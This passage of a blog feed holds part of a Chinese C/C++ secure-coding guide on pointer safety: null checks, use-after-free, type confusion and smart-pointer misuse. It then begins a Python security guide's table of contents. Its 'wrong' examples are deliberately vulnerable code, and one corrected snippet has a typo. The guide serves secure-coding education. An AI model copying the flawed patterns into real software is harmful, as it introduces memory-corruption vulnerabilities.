title="8.1 【建议】检查在pointer上使用sizeof"></a>8.1 【建议】检查在pointer上使用sizeof</h4><p>除了测试当前指针长度，否则一般不会在pointer上使用sizeof。</p><p>正确：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> pointer_length = <span class="built_in">sizeof</span>(<span class="type">void</span>*);</span><br></pre></td></tr></table></figure><p>可能错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> structure_length = <span class="built_in">sizeof</span>(Foo*);</span><br></pre></td></tr></table></figure><p>可能是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> structure_length = <span class="built_in">sizeof</span>(Foo);</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.8.2"></a></p><h4 id="8-2-【必须】检查直接将数组和0比较的代码"><a href="#8-2-【必须】检查直接将数组和0比较的代码" class="headerlink" title="8.2 【必须】检查直接将数组和0比较的代码"></a>8.2 【必须】检查直接将数组和0比较的代码</h4><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>];</span><br><span class="line">...;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">0</span>)</span><br><span class="line">  ...;</span><br></pre></td></tr></table></figure><p>该判断永远为真，等价于:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>];</span><br><span class="line">...;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (&amp;a[<span class="number">0</span>])</span><br><span class="line">  ...;</span><br></pre></td></tr></table></figure><p>可能是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>];</span><br><span class="line">...;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[<span class="number">0</span>] &gt; <span class="number">0</span>)</span><br><span class="line">  ...;</span><br></pre></td></tr></table></figure><p>开启足够的编译器警告（GCC 中为 <code>-Waddress</code>，并已包含在 <code>-Wall</code> 中），并设置为错误，可以在编译期间发现该问题。</p><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.8.3"></a></p><h4 id="8-3-【必须】不应当向指针赋予写死的地址"><a href="#8-3-【必须】不应当向指针赋予写死的地址" class="headerlink" title="8.3 【必须】不应当向指针赋予写死的地址"></a>8.3 【必须】不应当向指针赋予写死的地址</h4><p>特殊情况需要特殊对待（比如开发硬件固件时可能需要写死）</p><p>但是如果是系统驱动开发之类的，写死可能会导致后续的问题。</p><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.8.4"></a></p><h4 id="8-4-【必须】检查空指针"><a href="#8-4-【必须】检查空指针" class="headerlink" title="8.4 【必须】检查空指针"></a>8.4 【必须】检查空指针</h4><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*foo = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!foo) &#123;</span><br><span class="line">  <span class="built_in">ERROR</span>(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!foo) &#123;</span><br><span class="line">  <span class="built_in">ERROR</span>(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*foo = <span class="number">100</span>;</span><br></pre></td></tr></table></figure><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">(<span class="type">char</span>* bar)</span> </span>&#123;</span><br><span class="line">  *bar = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">(<span class="type">char</span>* bar)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(bar)</span><br><span class="line">    *bar = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>低风险-拒绝服务</code></p><p><a id="1.8.5"></a></p><h4 id="8-5-【必须】释放完后置空指针"><a href="#8-5-【必须】释放完后置空指针" class="headerlink" title="8.5 【必须】释放完后置空指针"></a>8.5 【必须】释放完后置空指针</h4><p>在对指针进行释放后，需要将该指针设置为NULL，以防止后续free指针的误用，导致UAF等其他内存破坏问题。尤其是在结构体、类里面存储的原始指针。</p><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span>* p = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(p, <span class="string">&quot;hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, p);</span><br><span class="line">  <span class="built_in">free</span>(p); <span class="comment">// 此时p所指向的内存已被释放，但是p所指的地址仍然不变</span></span><br><span class="line">  <span class="comment">// 未设置为NULL，可能导致UAF等内存错误</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;  <span class="comment">// 没有起到防错作用</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, p); <span class="comment">// 错误使用已经释放的内存</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span>* p = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(p, <span class="string">&quot;hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="comment">// 此时p所指向的内存已被释放，但是p所指的地址仍然不变</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, p);</span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="comment">//释放后将指针赋值为空</span></span><br><span class="line">  p = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>)  &#123; <span class="comment">// 没有起到防错作用</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, p); <span class="comment">// 错误使用已经释放的内存</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于 C++ 代码，使用 string、vector、智能指针等代替原始内存管理机制，可以大量减少这类错误。</p><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.8.6"></a></p><h4 id="8-6-【必须】防止错误的类型转换（type-confusion）"><a href="#8-6-【必须】防止错误的类型转换（type-confusion）" class="headerlink" title="8.6 【必须】防止错误的类型转换（type confusion）"></a>8.6 【必须】防止错误的类型转换（type confusion）</h4><p>在对指针、对象或变量进行操作时，需要能够正确判断所操作对象的原始类型。如果使用了与原始类型不兼容的类型进行访问，则存在安全隐患。</p><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> NAME_TYPE = <span class="number">1</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> ID_TYPE = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该类型根据 msg_type 进行区分，如果在对MessageBuffer进行操作时没有判断目标对象，则存在类型混淆</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">MessageBuffer</span> &#123;</span><br><span class="line">  <span class="type">int</span> msg_type;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">int</span> name_id;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">MessageBuffer</span> buf;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* default_message = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">  <span class="comment">// 设置该消息类型为 NAME_TYPE，因此buf预期的类型为 msg_type + name</span></span><br><span class="line">  buf.msg_type = NAME_TYPE;</span><br><span class="line">  buf.name = default_message;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pointer of buf.name is %p\n&quot;</span>, buf.name);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 没有判断目标消息类型是否为ID_TYPE，直接修改nameID，导致类型混淆</span></span><br><span class="line">  buf.name_id = user_controlled_value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf.msg_type == NAME_TYPE) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Pointer of buf.name is now %p\n&quot;</span>, buf.name);</span><br><span class="line">    <span class="comment">// 以NAME_TYPE作为类型操作，可能导致非法内存读写</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Message: %s\n&quot;</span>, buf.name);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Message: Use ID %d\n&quot;</span>, buf.name_id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确（判断操作的目标是否是预期类型）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">MessageBuffer</span> buf;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* default_message = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">  <span class="comment">// 设置该消息类型为 NAME_TYPE，因此buf预期的类型为 msg_type + name</span></span><br><span class="line">  buf.msg_type = NAME_TYPE;</span><br><span class="line">  buf.name = default_msessage;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pointer of buf.name is %p\n&quot;</span>, buf.name);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断目标消息类型是否为 ID_TYPE，不是预期类型则做对应操作</span></span><br><span class="line">  <span class="keyword">if</span> (buf.msg_type == ID_TYPE)</span><br><span class="line">    buf.name_id = user_controlled_value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf.msg_type == NAME_TYPE) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Pointer of buf.name is now %p\n&quot;</span>, buf.name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Message: %s\n&quot;</span>, buf.name);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Message: Use ID %d\n&quot;</span>, buf.name_id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.8.7"></a></p><h4 id="8-7-【必须】智能指针使用安全"><a href="#8-7-【必须】智能指针使用安全" class="headerlink" title="8.7 【必须】智能指针使用安全"></a>8.7 【必须】智能指针使用安全</h4><p>在使用智能指针时，防止其和原始指针的混用，否则可能导致对象生命周期问题，例如 UAF 等安全风险。</p><p>错误例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Foo</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123; data_ = num; &#125;;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Function</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;Obj is %p, data = %d\n&quot;</span>, <span class="keyword">this</span>, data_); &#125;;</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span> data_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::unique_ptr&lt;Foo&gt; fool_u_ptr = <span class="literal">nullptr</span>;</span><br><span class="line">Foo* pfool_raw_ptr = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Risk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  fool_u_ptr = <span class="built_in">make_unique</span>&lt;Foo&gt;(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 从独占智能指针中获取原始指针,&lt;Foo&gt;(1)</span></span><br><span class="line">  pfool_raw_ptr = fool_u_ptr.<span class="built_in">get</span>();</span><br><span class="line">  <span class="comment">// 调用&lt;Foo&gt;(1)的函数</span></span><br><span class="line">  pfool_raw_ptr-&gt;<span class="built_in">Function</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 独占智能指针重新赋值后会释放内存</span></span><br><span class="line">  fool_u_ptr = <span class="built_in">make_unique</span>&lt;Foo&gt;(<span class="number">2</span>);</span><br><span class="line">  <span class="comment">// 通过原始指针操作会导致UAF，pfool_raw_ptr指向的对象已经释放</span></span><br><span class="line">  pfool_raw_ptr-&gt;<span class="built_in">Function</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="comment">// Obj is 0000027943087B80, data = 1</span></span><br><span class="line"><span class="comment">// Obj is 0000027943087B80, data = -572662307</span></span><br></pre></td></tr></table></figure><p>正确，通过智能指针操作:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Safe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  fool_u_ptr = <span class="built_in">make_unique</span>&lt;Foo&gt;(<span class="number">1</span>);</span><br><span class="line">  <span class="comment">// 调用&lt;Foo&gt;(1)的函数</span></span><br><span class="line">  fool_u_ptr-&gt;<span class="built_in">Function</span>();</span><br><span class="line"></span><br><span class="line">  fool_u_ptr = <span class="built_in">make_unique</span>&lt;Foo&gt;(<span class="number">2</span>);</span><br><span class="line">  <span class="comment">// 调用&lt;Foo&gt;(2)的函数</span></span><br><span class="line">  fool_u_ptr-&gt;<span class="built_in">Function</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="comment">// Obj is 000002C7BB550830, data = 1</span></span><br><span class="line"><span class="comment">// Obj is 000002C7BB557AF0, data = 2</span></span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- markdown=&quot;1&quot; is required for GitHub Pages to render the TOC properly. --&gt;

&lt;details markdown=&quot;1&quot;&gt;
  &lt;summary&gt;目录&lt;/summary&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a </summary>
      
    
    
    
    <category term="网络安全" scheme="https://dxhm.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="编程语言" scheme="https://dxhm.github.io/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="程序开发安全" scheme="https://dxhm.github.io/tags/%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PYTHON PROGRAM-GUIDE</title>
    <link href="https://dxhm.github.io/2022/03/17/PYTHON-PROGRAM-GUIDE/"/>
    <id>https://dxhm.github.io/2022/03/17/PYTHON-PROGRAM-GUIDE/</id>
    <published>2022-03-17T12:53:47.000Z</published>
    <updated>2023-06-30T10:53:08.131Z</updated>
    
    <content type="html"><![CDATA[<ul><li><a href="#%E9%80%9A%E7%94%A8%E7%B1%BB">通用类</a><ul><li><a href="#i-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0">I. 代码实现</a><ul><li><a href="#11-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95">1.1 加密算法</a><ul><li><a href="#111-%E5%BF%85%E9%A1%BB%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95">1.1.1 【必须】避免使用不安全的对称加密算法</a></li></ul></li><li><a href="#12-%E7%A8%8B%E5%BA%8F%E6%97%A5%E5%BF%97">1.2 程序日志</a><ul><li><a href="#121-%E5%BB%BA%E8%AE%AE%E5%AF%B9%E6%AF%8F%E4%B8%AA%E9%87%8D%E8%A6%81%E8%A1%8C%E4%B8%BA%E9%83%BD%E8%AE%B0%E5%BD%95%E6%97%A5%E5%BF%97">1.2.1 【建议】对每个重要行为都记录日志</a></li><li><a href="#122-%E5%BB%BA%E8%AE%AE%E7%A6%81%E6%AD%A2%E5%B0%86%E6%9C%AA%E7%BB%8F%E9%AA%8C%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E7%9B%B4%E6%8E%A5%E8%AE%B0%E5%BD%95%E6%97%A5%E5%BF%97">1.2.2 【建议】禁止将未经验证的用户输入直接记录日志</a></li><li><a href="#123-%E5%BB%BA%E8%AE%AE%E9%81%BF%E5%85%8D%E5%9C%A8%E6%97%A5%E5%BF%97%E4%B8%AD%E4%BF%9D%E5%AD%98%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF">1.2.3 【建议】避免在日志中保存敏感信息</a></li></ul></li><li><a href="#13-%E7%B3%BB%E7%BB%9F%E5%8F%A3%E4%BB%A4">1.3 系统口令</a><ul><li><a href="#131-%E5%BF%85%E9%A1%BB%E7%A6%81%E6%AD%A2%E4%BD%BF%E7%94%A8%E7%A9%BA%E5%8F%A3%E4%BB%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%B7%B2%E6%B3%84%E9%9C%B2%E5%8F%A3%E4%BB%A4">1.3.1 【必须】禁止使用空口令、弱口令、已泄露口令</a></li><li><a href="#132-%E5%BF%85%E9%A1%BB%E5%8F%A3%E4%BB%A4%E5%BC%BA%E5%BA%A6%E8%A6%81%E6%B1%82">1.3.2 【必须】口令强度要求</a></li><li><a href="#133-%E5%BF%85%E9%A1%BB%E5%8F%A3%E4%BB%A4%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8">1.3.3 【必须】口令存储安全</a></li><li><a href="#134-%E5%BF%85%E9%A1%BB%E7%A6%81%E6%AD%A2%E4%BC%A0%E9%80%92%E6%98%8E%E6%96%87%E5%8F%A3%E4%BB%A4">1.3.4 【必须】禁止传递明文口令</a></li><li><a href="#135-%E5%BF%85%E9%A1%BB%E7%A6%81%E6%AD%A2%E5%9C%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E4%BF%A1%E9%81%93%E4%B8%AD%E4%BC%A0%E8%BE%93%E5%8F%A3%E4%BB%A4">1.3.5 【必须】禁止在不安全的信道中传输口令</a></li></ul></li></ul></li><li><a href="#ii-%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83">II. 配置&amp;环境</a><ul><li><a href="#21-python%E7%89%88%E6%9C%AC%E9%80%89%E6%8B%A9">2.1 Python版本选择</a><ul><li><a href="#211-%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8python-36%E7%9A%84%E7%89%88%E6%9C%AC">2.1.1 【建议】使用Python 3.6+的版本</a></li></ul></li><li><a href="#22-%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85%E5%AE%89%E5%85%A8">2.2 第三方包安全</a><ul><li><a href="#222-%E5%BF%85%E9%A1%BB%E7%A6%81%E6%AD%A2%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%BB%84%E4%BB%B6">2.2.2 【必须】禁止使用不安全的组件</a></li></ul></li><li><a href="#23-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF">2.3 配置信息</a><ul><li><a href="#231-%E5%BF%85%E9%A1%BB%E5%AF%86%E9%92%A5%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8">2.3.1 【必须】密钥存储安全</a></li><li><a href="#232-%E5%BF%85%E9%A1%BB%E7%A6%81%E6%AD%A2%E7%A1%AC%E7%BC%96%E7%A0%81%E6%95%8F%E6%84%9F%E9%85%8D%E7%BD%AE">2.3.2 【必须】禁止硬编码敏感配置</a></li></ul></li></ul></li></ul></li><li><a href="#%E5%90%8E%E5%8F%B0%E7%B1%BB">后台类</a><ul><li><a href="#i-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0-1">I. 代码实现</a><ul><li><a href="#11-%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81">1.1 输入验证</a><ul><li><a href="#111-%E5%BF%85%E9%A1%BB%E6%8C%89%E7%B1%BB%E5%9E%8B%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E6%A0%A1%E9%AA%8C">1.1.1 【必须】按类型进行数据校验</a></li></ul></li><li><a href="#12-sql%E6%93%8D%E4%BD%9C">1.2 SQL操作</a><ul><li><a href="#121-%E5%BF%85%E9%A1%BB%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2">1.2.1 【必须】使用参数化查询</a></li><li><a href="#122-%E5%BF%85%E9%A1%BB%E5%AF%B9%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8C%E8%BF%87%E6%BB%A4">1.2.2 【必须】对参数进行过滤</a></li></ul></li><li><a href="#13-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">1.3 执行命令</a><ul><li><a href="#131-%E5%BB%BA%E8%AE%AE%E9%81%BF%E5%85%8D%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4">1.3.1 【建议】避免直接调用函数执行系统命令</a></li><li><a href="#132-%E5%BF%85%E9%A1%BB%E8%BF%87%E6%BB%A4%E4%BC%A0%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E7%9A%84%E5%AD%97%E7%AC%A6">1.3.2 【必须】过滤传入命令执行函数的字符</a></li><li><a href="#133-%E5%BF%85%E9%A1%BB%E7%A6%81%E6%AD%A2%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">1.3.3 【必须】禁止不安全的代码执行</a></li></ul></li><li><a href="#14-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C">1.4 文件操作</a><ul><li><a href="#141-%E5%BF%85%E9%A1%BB%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E9%99%90%E5%88%B6">1.4.1 【必须】文件类型限制</a></li><li><a href="#142-%E5%BF%85%E9%A1%BB%E7%A6%81%E6%AD%A2%E5%A4%96%E9%83%A8%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E4%BA%8E%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9B%AE%E5%BD%95">1.4.2 【必须】禁止外部文件存储于可执行目录</a></li><li><a href="#143-%E5%BF%85%E9%A1%BB%E9%81%BF%E5%85%8D%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A">1.4.3 【必须】避免路径穿越</a></li><li><a href="#144-%E5%BF%85%E9%A1%BB%E7%A6%81%E7%94%A8xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E7%9A%84%E6%96%B9%E6%B3%95">1.4.4 【必须】禁用XML外部实体的方法</a></li><li><a href="#145-%E5%BF%85%E9%A1%BB%E7%A6%81%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%87%BD%E6%95%B0">1.4.5 【必须】禁用不安全的反序列化函数</a></li><li><a href="#146-%E5%BB%BA%E8%AE%AE%E9%81%BF%E5%85%8D%E8%B7%AF%E5%BE%84%E6%8B%BC%E6%8E%A5">1.4.6 【建议】避免路径拼接</a></li><li><a href="#147-%E5%BB%BA%E8%AE%AE%E6%96%87%E4%BB%B6%E5%90%8Dhash%E5%8C%96%E5%A4%84%E7%90%86">1.4.7 【建议】文件名hash化处理</a></li></ul></li><li><a href="#15-%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82">1.5 网络请求</a><ul><li><a href="#151-%E5%BF%85%E9%A1%BB%E9%99%90%E5%AE%9A%E8%AE%BF%E9%97%AE%E7%BD%91%E7%BB%9C%E8%B5%84%E6%BA%90%E5%9C%B0%E5%9D%80%E8%8C%83%E5%9B%B4">1.5.1 【必须】限定访问网络资源地址范围</a></li></ul></li><li><a href="#16-%E5%93%8D%E5%BA%94%E8%BE%93%E5%87%BA">1.6 响应输出</a><ul><li><a href="#161-%E5%BF%85%E9%A1%BB%E8%AE%BE%E7%BD%AE%E6%AD%A3%E7%A1%AE%E7%9A%84http%E5%93%8D%E5%BA%94%E5%8C%85%E7%B1%BB%E5%9E%8B">1.6.1 